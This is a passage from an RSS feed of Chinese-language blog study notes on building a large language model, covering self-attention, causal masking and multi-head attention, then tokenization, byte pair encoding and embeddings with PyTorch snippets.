&lt;p&gt;为什么是K与Q呢?V做什么?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来，我们对先前计算的每个注意力分数进行归一化.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我知道,点积可以衡量相似度,但最好先标准化(?我忘记准确的名词了,就是使其长度为1,上过高中都知道).这里算出来诸多注意力分数后再归一化.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;归一化采用的是&lt;code&gt;softmax&lt;/code&gt;函数:&lt;/p&gt;
&lt;p&gt;$$ softmax(z_{i}) = \frac{e^{z_{i}}}{\sum_{j}e^{z_{j}}}$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;softmax&lt;/code&gt;是神经网络常用的激活函数,有一些优点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最后,计算上下文向量的方法是每个输入向量与对应的注意力权重的加权和.&lt;/p&gt;
&lt;h3&gt;为所有输入的token计算注意力权重&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;attn_scores = inputs @ inputs.T
print(attn_scores)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;inputs&lt;/code&gt;是[token_num, embedding_dim],结果的形状是[token_num, token_num].即所有输入对的注意力得分.&lt;/p&gt;
&lt;p&gt;进一步计算注意力权重:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;attn_weights = torch.softmax(attn_scores, dim=-1)
print(attn_weights)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在使用 PyTorch 时，像 &lt;code&gt;torch.softmax&lt;/code&gt; 这样的函数中的 &lt;code&gt;dim&lt;/code&gt; 参数指定了将在输入张量中的哪个维度上进行归一化计算。
&lt;code&gt;dim=-1&lt;/code&gt;表示表示沿着最后一个维度进行归一化操作.&lt;/p&gt;
&lt;h2&gt;实现带有可训练权重的自注意力机制&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.13.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我发现按以上方法没有任何可训练权重.原始Transformer架构通过设置可训练的&lt;code&gt;W_Q&lt;/code&gt;/&lt;code&gt;W_K&lt;/code&gt;/&lt;code&gt;W_V&lt;/code&gt;矩阵来实现这一点.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这种自注意力机制也被称为放缩点积注意力.&lt;/p&gt;
&lt;h3&gt;逐步计算注意力权重&lt;/h3&gt;
&lt;p&gt;我们通过引入三个可训练的权重矩阵：Wq、Wk 和 Wv 来逐步实现自注意力机制。这三个矩阵用于将嵌入后的输入 token $x^{(i)}$ 映射为查询向量、键向量和值向量.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.14.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.manual_seed(123)
W_query = torch.nn.Parameter(torch.rand(d_in, d_out))
W_key   = torch.nn.Parameter(torch.rand(d_in, d_out))
W_value = torch.nn.Parameter(torch.rand(d_in, d_out))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 GPT 类模型中，输入维度和输出维度通常是相同的。&lt;/p&gt;
&lt;p&gt;我们可以通过矩阵乘法获取所有元素的key和value向量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;keys = inputs @ W_key
values = inputs @ W_value
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;在标准的自注意力机制中，W、K、V向量都是固定的，然而，由于 GPT 模型是由多层自注意力模块堆叠而成，每一层都会根据当前输入和上下文信息，动态调整查询、键和值向量的&lt;strong&gt;权重矩阵&lt;/strong&gt;。因此，即使初始的词嵌入和权重矩阵是固定的，经过多层处理后，模型能够生成与当前上下文相关的 Q、K、V 向量权重矩阵，最终计算出的Q、K、V 向量也就能反映出上下文的语义了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.16.png&quot; alt=&quot;&quot;&gt;
接下来的注意力权重计算,使用点积缩放注意力机制,将注意力得分除以嵌入维度的平方根来进行缩放:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;d_k = keys.shape[-1]
attn_weights_2 = torch.softmax(attn_scores_2 / d_k**0.5, dim=-1)
print(attn_weights_2)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;在自注意力机制中，查询向量（Query）与键向量（Key）之间的点积用于计算注意力权重。然而，当嵌入维度较大时，点积的结果可能会非常大。那么大的点积对接下来的计算有哪些具体影响呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Softmax函数的特性&lt;/strong&gt;：在计算注意力权重时，点积结果会通过Softmax函数转换为概率分布。而Softmax函数对输入值的差异非常敏感，当输入值较大时，Softmax的输出会趋近于0或1，表现得类似于阶跃函数（step function）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;梯度消失问题&lt;/strong&gt;：当Softmax的输出接近0或1时，其梯度会非常小，接近于零（可以通过3.3.1小节中提到的Softmax公式推断）。这意味着在反向传播过程中，梯度更新幅度会很小，导致模型学习速度减慢，甚至训练停滞。
为了解决上述问题，在计算点积后，将结果除以嵌入维度的平方根。这样可以将点积结果缩放到适当的范围，避免Softmax函数进入梯度平缓区，从而保持梯度的有效性，促进模型的正常训练。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.17.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;现在我们通过值向量的加权和来计算上下文向量。这里，注意力权重作为加权因子，用于衡量每个值向量的重要性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;context_vec_2 = attn_weights_2 @ values
print(context_vec_2)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这就是一个上下文向量$z^{(2)}$.我们将计算输入序列中的所有上下文向量,从$z^{(1)}$到$z^{(T)}$.&lt;/p&gt;
&lt;h3&gt;实现一个简洁的子注意力机制Python类&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;torch.nn.Module&lt;/code&gt;是PyTorch模型的基础组件,提供了创建和管理模型层所需的必要功能.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.18.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;使用因果注意力机制来屏蔽后续词&lt;/h2&gt;
&lt;p&gt;屏蔽注意力是一种特殊的自注意力形式.它限制模型在处理任何给定的 token 时，只能考虑序列中的前一个和当前输入，而不能看到后续的内容。这与标准的自注意力机制形成对比，后者允许模型同时访问整个输入序列。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.19.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;应用因果注意力掩码&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.20.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们可以使用 PyTorch 的 &lt;code&gt;tril&lt;/code&gt; 函数生成一个掩码矩阵，使对角线以上的值为零：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;context_length = attn_scores.shape[0]
mask_simple = torch.tril(torch.ones(context_length, context_length))
print(mask_simple)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;生成的掩码如下所示：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;tensor([[1., 0., 0., 0., 0., 0.],
        [1., 1., 0., 0., 0., 0.],
        [1., 1., 1., 0., 0., 0.],
        [1., 1., 1., 1., 0., 0.],
        [1., 1., 1., 1., 1., 0.],
        [1., 1., 1., 1., 1., 1.]])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在，我们可以将这个掩码矩阵与注意力权重相乘，从而将对角线以上的值置零。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;masked_simple = attn_weights*mask_simple
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第三步是将注意力权重重新归一化,使得每一行的权重和再次等于1.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我一开始觉得,两次softmax混入了后面的信息,实则不然,证明如下:
第一次softmax:
$$ \frac{e^{z_{1}}}{\sum e^{z_{j}}}, \frac{e^{z_{2}}}{\sum e^{z_{j}}},\frac{e^{z_{3}}}{\sum e^{z_{j}}},\dots$$
第二次softmax:
$$ \frac{e^{(1)}}{e^{(1)}+e^{(2)}+e^{(3)}},\frac{e^{(2)}}{e^{(1)}+e^{(2)}+e^{(3)}},\frac{e^{(3)}}{e^{(1)}+e^{(2)}+e^{(3)}} $$
化简得$$\frac{e^{z_{1}}}{e^{z_{1}}+e^{z_{2}}+e^{z_{3}}},\frac{e^{z_{2}}}{e^{z_{1}}+e^{z_{2}}+e^{z_{3}}},\frac{e^{z_{3}}}{e^{z_{1}}+e^{z_{2}}+e^{z_{3}}}$$
不包含后面的信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.21.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mask = torch.triu(torch.ones(context_length, context_length), diagonal=1)
masked = attn_scores.masked_fill(mask.bool(), -torch.inf)
print(masked)
attn_weights = torch.softmax(masked / keys.shape[-1]**0.5, dim=1) print(attn_weights)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;使用&lt;code&gt;dropout&lt;/code&gt;遮掩额外的注意力权重&lt;/h3&gt;
&lt;p&gt;Dropout 在深度学习中是一种技术，即在训练过程中随机忽略一些隐藏层单元，实际上将它们“丢弃”。这种方法有助于防止过拟合，确保模型不会过于依赖任何特定的隐藏层单元组合。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.22.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当对注意力权重矩阵应用 50% 的 dropout 时，矩阵中一半的元素会被随机设置为零。为了补偿有效元素的减少，矩阵中剩余元素的值会被放大 1/0.5 = 2 倍。这个缩放操作至关重要，可以在训练和推理阶段保持注意力机制的整体权重平衡，确保注意力机制在这两个阶段的平均影响保持一致。&lt;/p&gt;
&lt;h3&gt;实现一个简洁的因果注意力类&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;CausalAttention&lt;/code&gt;类添加了&lt;code&gt;dropout&lt;/code&gt;和因果掩码组件.&lt;/p&gt;
&lt;h2&gt;从单头注意力拓展到多头注意力&lt;/h2&gt;
&lt;p&gt;多头’一词指的是将注意力机制划分为多个‘头’，每个头独立运作。在这种情况下，单个因果注意力模块可以视为单头注意力，即只有一组注意力权重用于按顺序处理输入。&lt;/p&gt;
&lt;h3&gt;堆叠多层单头注意力&lt;/h3&gt;
&lt;p&gt;每个实例都具有独立的权重，然后将它们的输出合并。
它对于识别复杂模式至关重要，这是基于 Transformer 的大语言模型所擅长的能力之一。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.24.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.25.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;通过权重分割实现多头注意力机制&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter3/figure3.26.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Q,K,V张量的拆分是通过张量的重塑和转置操作实现的.&lt;/p&gt;
&lt;p&gt;关键操作是将 &lt;code&gt;d_out&lt;/code&gt; 维度拆分成 &lt;code&gt;num_heads&lt;/code&gt; 和 &lt;code&gt;head_dim&lt;/code&gt;，其中 &lt;code&gt;head_dim = d_out / num_heads&lt;/code&gt;。这种拆分通过 &lt;code&gt;.view&lt;/code&gt; 方法实现：将形状为 &lt;code&gt;(b, num_tokens, d_out)&lt;/code&gt; 的张量重塑为 &lt;code&gt;(b, num_tokens, num_heads, head_dim)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;接下来对张量进行转置操作，将 &lt;code&gt;num_heads&lt;/code&gt; 维度移动到 &lt;code&gt;num_tokens&lt;/code&gt; 维度之前，使其形状变为 &lt;code&gt;(b, num_heads, num_tokens, head_dim)&lt;/code&gt;。这种转置对于在不同注意力头之间正确对齐查询（queries）、键（keys）和值（values），并高效执行批量矩阵乘法至关重要。&lt;/p&gt;
&lt;p&gt;在多头注意力机制中，计算完注意力权重和上下文向量之后，将所有头的上下文向量转置回形状 &lt;code&gt;(b, num_tokens, num_heads, head_dim)&lt;/code&gt;。然后将这些向量重新塑形（展平）为 &lt;code&gt;(b, num_tokens, d_out)&lt;/code&gt; 的形状，从而有效地将所有头的输出组合在一起。&lt;/p&gt;
&lt;p&gt;此外，我们在多头注意力机制中添加了一个称为输出投影层（self.out_proj）的模块，用于在组合多个头的输出后进行投影。而在因果注意力类中并没有这个投影层。这个输出投影层并非绝对必要（详见附录 B 的参考部分），但由于它在许多 LLM 架构中被广泛使用，因此我们在这里加上以保持完整性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个线性层的作用是什么?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最小的 GPT-2 模型（1.17 亿参数）具有 12 个注意力头和 768 的上下文向量嵌入大小。而最大的 GPT-2 模型（15 亿参数）则具有 25 个注意力头和 1600 的上下文向量嵌入大小。请注意，在 GPT 模型中，token 输入的嵌入大小与上下文嵌入大小是相同的（&lt;code&gt;d_in = d_out&lt;/code&gt;）。&lt;/p&gt;
&lt;h2&gt;本章摘要&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;本章的注意力机制是整本书中最重要的内容&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sun, 21 Sep 2025 16:00:00 GMT</pubDate></item><item><title>处理文本数据 | LLM</title><link>https://tankimzeg.top/blog/llm/ch2_process-text-data/</link><guid isPermaLink="true">https://tankimzeg.top/blog/llm/ch2_process-text-data/</guid><description>从零构建大语言模型第2章:本章讲解如何将文本数据转换为词嵌入</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/llm/ch2_process-text-data/&quot;&gt;https://tankimzeg.top/blog/llm/ch2_process-text-data/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;理解词嵌入&lt;/h2&gt;
&lt;p&gt;深度神经网络模型，包括 LLM，往往无法直接处理原始文本。这是因为文本是离散的分类数据，它与实现和训练神经网络所需的数学运算不兼容。因此，我们需要一种方法将单词表示为连续值向量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;不同的数据源在转换成嵌入时需要用到不同的技术.这些张量就存储了数据的信息.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mark一下检索增强技术(&lt;a href=&quot;https://waytoagi.feishu.cn/wiki/PUUfwNkwqielBOkbO5RcjnTQnUd&quot;&gt;RAG&lt;/a&gt;),与向量数据库有关联!当用户提交一个查询时，首先将这个查询也编码成一个向量，然后去承载外部知识库的向量数据库中检索（检索技术有很多种）与问题相关的信息。检索到的信息被作为额外的上下文信息输入到LLM中，LLM会将这些外部信息与原始输入结合起来，以更准确和丰富的内容生成回答。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;尽管GPT在文本生成任务中表现强大，但它们依赖的是预训练的知识，这意味着它们的回答依赖于模型在预训练阶段学习到的信息。这种方式导致了几个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;知识的时效性：&lt;/strong&gt; 模型的知识基于它的预训练数据，因此无法获取最新的信息。比如，GPT-3 的知识截止到 2021 年，无法回答最新的事件或发展。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模型大小的限制：&lt;/strong&gt; 即使是大型模型，所能存储和运用的知识也是有限的。如果任务涉及特定领域（如医学、法律、科学研究），模型在预训练阶段可能没有涵盖足够的信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;生成的准确性：&lt;/strong&gt; 生成模型可能会凭空编造信息（即“幻觉现象”），导致生成内容不准确或虚假。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Word2Vec的核心思想是，出现在相似上下文中的词通常具有相似的含义。因此可以聚类:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们的向量数据库也是这样聚类索引的.&lt;/p&gt;
&lt;h2&gt;文本分词&lt;/h2&gt;
&lt;p&gt;将输入文本拆分为单个token，这是创建 LLM 嵌入所需的预处理步骤。这些token可以是单个单词或特殊字符，包括标点符号&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;将英文文本分词,忽略空格(对于空格敏感的Python代码就不能忽略).这里使用了一个简单的正则表达式来分割文本:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;preprocessed = re.split(r&amp;#39;([,.:;?_!&amp;quot;()\&amp;#39;]|--|\s)&amp;#39;, raw_text)
preprocessed = [item.strip() for item in preprocessed if item.strip()]
print(len(preprocessed))
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;将token转换为token IDs&lt;/h2&gt;
&lt;p&gt;我以前其实已经见过类似的处理[^1],只是没有意识到这是转换为嵌入向量的中间步骤.&lt;/p&gt;
&lt;p&gt;我们需要构建一个词汇表.这个词汇表定义了每个独特单词和特殊字符与唯一整数的映射.&lt;/p&gt;
&lt;p&gt;为&lt;code&gt;SimpleTokenizerV1&lt;/code&gt;类实现&lt;code&gt;encode&lt;/code&gt;和&lt;code&gt;decode&lt;/code&gt;方法.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;encode&lt;/code&gt;将token转换为id,&lt;code&gt;decode&lt;/code&gt;将id转换为token.&lt;/p&gt;
&lt;p&gt;目前,如果遇到不再词汇表里的单词会转换失败.&lt;/p&gt;
&lt;h2&gt;添加特殊上下文token&lt;/h2&gt;
&lt;p&gt;为了处理一些特殊文本,需要引入特殊token:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[BOS]（序列开始）：这个token表示文本的起始位置，指示 LLM 内容的开始。&lt;/li&gt;
&lt;li&gt;[EOS]（序列结束）：这个token位于文本的末尾，在连接多个无关文本时特别有用，类似于 &amp;lt;|endoftext|&amp;gt;。例如，在合并两个不同的维基百科文章或书籍时， [EOS] token指示一篇文章结束和下一篇文章开始。&lt;/li&gt;
&lt;li&gt;[PAD]（填充）：在使用大于 1 的批量大小数据集训练 LLM 时，批量可能包含不同长度的文本。为了确保所有文本长度一致，较短的文本会用 [PAD] token进行扩展或填充，直到达到批量中最长文本的长度。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于我们的简单LLM来说,引入两种特殊token就够了:
&lt;code&gt;&amp;lt;|endoftext|&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;|unk|&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在遇到不在词汇表中的单词时使用一个&amp;lt;|unk|&amp;gt; token。此外，我们还会在不相关的文本之间添加一个特殊的&lt;code&gt;&amp;lt;|endoftext|&amp;gt;&lt;/code&gt; token。例如，在对多个独立文档或书籍进行GPT类大语言模型的训练时，通常会在每个文档或书籍之前插入一个token，以连接前一个文本源，如图2.10所示。这有助于大语言模型理解，尽管这些文本源在训练中是连接在一起的，但它们实际上是无关的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;SimpleTokenizerV2&lt;/code&gt;类以支持特殊token.&lt;/p&gt;
&lt;p&gt;填充(PAD)token的目的是对齐batch以便并行训练,告知模型忽略即可.&lt;/p&gt;
&lt;p&gt;此外，用于 GPT 模型的分词器也不使用 &amp;lt;|unk|&amp;gt; 标记来表示词汇表之外的词。相反，GPT 模型采用字节对编码分词器，它将单词分解为子词单元.&lt;/p&gt;
&lt;h2&gt;字节对编码(Byte pair encoding)&lt;/h2&gt;
&lt;p&gt;字节对编码(BPE)是一种更复杂的分词方案.&lt;/p&gt;
&lt;p&gt;现成的一个名为&lt;code&gt;tiktoken&lt;/code&gt;的Python库使用Rust非常高效地实现了BPE算法!&lt;/p&gt;
&lt;p&gt;BPE不需要&lt;code&gt;&amp;lt;|unk|&amp;gt;&lt;/code&gt;也能正确编码和解码未知词汇的原因:
将不在其预定义词汇表中的单词分解为更小的子词单元甚至单个字符，使其能够处理超出词汇表的单词。因此，得益于BPE算法，如果分词器在分词过程中遇到一个不熟悉的单词，它可以将其表示为一系列子词token或字符.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.11.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;字节对编码是一种基于统计的方法，它会先从整个语料库中找出最常见的字节对（byte pair），然后把这些字节对合并成一个新的单元。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;使用滑动窗口进行数据采样&lt;/h2&gt;
&lt;p&gt;LLM通过预测文本中的下一个单词进行预训练.通过滑动窗口方法从训练数据集中提取输入-目标对.&lt;/p&gt;
&lt;p&gt;其实,这个采样策略我也在同一个地方见到[^1].&lt;/p&gt;
&lt;p&gt;采样过程中有几个参数: &lt;code&gt;batch_size&lt;/code&gt;, &lt;code&gt;max_length&lt;/code&gt;, &lt;code&gt;stride&lt;/code&gt;,即批次大小/上下文大小和步幅&lt;/p&gt;
&lt;p&gt;适当地调整步幅,这是为了全面利用数据集（我们不跳过任何单词），同时避免批次之间的重叠，因为更多的重叠可能会导致过拟合.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Inputs: 
	tensor([[ 40, 367, 2885, 1464], 
			[ 1807, 3619, 402, 271], 
			[10899, 2138, 257,7026], 
			[15632, 438, 2016, 257], 
			[ 922, 5891, 1576, 438], 
			[ 568, 340, 373, 645], 
			[ 1049, 5975, 284, 502], 
			[ 284, 3285, 326, 11]]) 

Targets: 
	tensor([[ 367, 2885, 1464, 1807], 
			[ 3619, 402, 271, 10899], 
			[ 2138, 257, 7026, 15632], 
			[ 438, 2016, 257, 922], 
			[ 5891, 1576, 438, 568], 
			[ 340, 373, 645, 1049], 
			[ 5975, 284, 502, 284], 
			[ 3285, 326, 11, 287]])
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;构建词嵌入层&lt;/h2&gt;
&lt;p&gt;对于GPT类大语言模型（LLM）来说，连续向量表示（Embedding）非常重要，原因在于这些模型使用深度神经网络结构，并通过反向传播算法（backpropagation）进行训练。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;向量嵌入的作用&lt;/strong&gt;
连续向量表示不仅让文本数据可以进入神经网络，还帮助模型捕捉和表示文本之间的语义关系。例如：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;同义词或相似词&lt;/strong&gt;：在向量空间中，相似的单词可以有接近的向量表示。这种语义相似性帮助模型理解上下文，并在生成文本时提供参考。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;上下文关系&lt;/strong&gt;：GPT 等 LLM 模型不仅依赖单词级别的向量表示，还会考虑句子或段落上下文，形成动态嵌入，从而生成更具连贯性的文本。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;strong&gt;反向传播算法的要求&lt;/strong&gt;
深度神经网络通过&lt;strong&gt;反向传播算法&lt;/strong&gt;进行训练，反向传播的本质是利用梯度下降法来更新网络的权重，以最小化损失函数（loss function）。反向传播要求每一层的输入、输出和权重都能够参与梯度计算，而梯度计算只能应用于数值数据。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;自动微分与梯度计算&lt;/strong&gt;：在反向传播中，神经网络会根据损失函数的导数来计算梯度，这个过程依赖于自动微分（automatic differentiation）。为了计算每层的梯度，输入的数据必须是数值形式（即向量），否则无法对离散的文本数据求导。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;梯度更新权重&lt;/strong&gt;：每次更新网络权重时，神经网络会根据每一层的输入和输出来调整权重，以更好地学习数据的模式。如果输入不是数值形式，就无法实现梯度更新，从而无法通过反向传播训练网络。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;torch&lt;/code&gt;中有一个&lt;code&gt;nn.Embedding&lt;/code&gt;提供嵌入操作:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import torch
embedding_layer = torch.nn.Embedding(num_emb, output_dim)
print(embedding_layer.weight)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就能看到一个形状为[num_emb, output_dim]的初始权重矩阵.可以看到，嵌入层的权重矩阵由比较小的随机值组成。这些值将在LLM训练过程中作为LLM优化的一部分被优化.每一行代表词汇表中一个token的权重.&lt;/p&gt;
&lt;p&gt;这样,我们就可以对输入转化为嵌入了:
&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.16.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;位置编码&lt;/h2&gt;
&lt;p&gt;因为只要是相同的词,就映射为同一个embedding,所以它对token的位置或顺序没有概念.因此向LLM注入额外的位置信息是有帮助的。&lt;/p&gt;
&lt;p&gt;解决的办法就是添加绝对位置嵌入和相对位置嵌入.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;绝对位置嵌入&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对于输入序列中的每个位置，都会将一个唯一的绝对位置嵌入向量添加到token的嵌入向量中，以传达其确切位置。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter2/figure2.18.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;相对位置嵌入
相对位置嵌入强调的是token之间的相对位置或距离。这意味着模型学习的是“相隔多远”的关系，而不是“在什么确切位置”。这样的优势在于，即使模型在训练时没有接触过不同的长度，它也可以更好地适应各种长度的序列。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;选择哪种类型的位置嵌入通常取决于特定的应用和所处理数据的性质。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;context_length = max_length
pos_embedding_layer = torch.nn.Embedding(context_length, output_dim)
pos_embeddings = pos_embedding_layer(torch.arange(context_length))
print(pos_embeddings.shape)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;torch.arange(context_length)&lt;/code&gt;包含一个从0到最大输入长度-1的整数序列.
在实际中,如果输入文本长度超出所支持的上下文长度,此时我们需要对文本进行截断 .&lt;/p&gt;
&lt;p&gt;把这些现在看起来随机的位置嵌入直接加到token嵌入,就得到了优化的具有位置信息的输入嵌入.现在,就算是相同的token,其嵌入也不同了.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;input_embeddings = token_embeddings + pos_embeddings
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在可作为LLM的核心模块的输入嵌入.&lt;/p&gt;
&lt;h2&gt;本章摘要&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;LLM 需要将文本数据转换为数值向量，这称之为嵌入，因为它们无法处理原始文本。嵌入将离散数据（如单词或图像）转化为连续的向量空间，从而使其能够与神经网络操作兼容。&lt;/li&gt;
